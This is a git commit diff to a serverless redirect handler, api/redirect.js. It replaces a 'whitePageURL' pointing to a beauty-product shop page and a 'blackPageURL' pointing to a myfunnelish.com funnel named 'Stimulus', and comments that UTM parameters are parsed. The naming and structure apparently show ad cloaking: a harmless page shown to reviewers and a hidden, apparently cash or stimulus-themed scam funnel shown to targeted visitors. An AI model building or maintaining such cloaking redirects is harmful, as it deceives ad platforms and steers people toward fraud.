f083bce392b2862e525a1e0057d12855a4667bdf
Hassan86639 <hassan86639@gmail.com>
2025-09-29 14:19:03 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://boopbeauty.co.uk/products/optimal-skin-pro-serum-copy";
-    const blackPageURL = "https://gymboreeusk.myfunnelish.com/cash-1735686017557538-1759052013535697";
+    const whitePageURL = "https://www.justmylook.com/products/bobbi-brown-weightless-skin-foundation-spf15-30ml";
+    const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
